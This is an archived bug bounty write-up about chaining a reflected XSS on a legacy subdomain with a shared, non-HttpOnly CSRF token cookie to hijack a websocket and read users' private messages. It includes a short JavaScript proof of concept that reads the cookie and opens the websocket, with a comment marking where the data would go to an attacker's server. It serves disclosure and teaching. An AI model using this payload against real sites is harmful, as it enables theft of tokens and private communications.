# Stealing private messages using XSS on subdomain

- **Source URL:** https://medium.com/@shcyber/stealing-private-messages-using-xss-on-subdomain-97f0304b132f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240113140601/https://medium.com/@shcyber/stealing-private-messages-using-xss-on-subdomain-97f0304b132f
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4889 (id 4889)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
This is a bug that I found on a private program.

The application (example.com) had a subdomain from the 90s that was vulnerable to reflected XSS. As there was no impactful data to steal or user actions to do I left it and moved on.

Whilst testing the main application, I noticed that the CSRF token was applied to the main application and all the subdomains (\*.example.com), and of course had no HttpOnly flag, so I was able to steal the CSRF token using the XSS.

The main application allowed users to privately message each other and enabled this using websockets. I used the XSS to initiate a websocket connection with the CSRF token as a parameter and I could steal the user’s chat messages.

POC CODE:

```
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
let csrfToken = getCookie("TOKEN")
let ws = new WebSocket("wss://example.com?token="+csrfToken);
ws.onmessage = function(e) {
 // send to attacker-controlled server
 alert(e.data)
}
```
**ALWAYS TRY TO PROVE IMPACT**
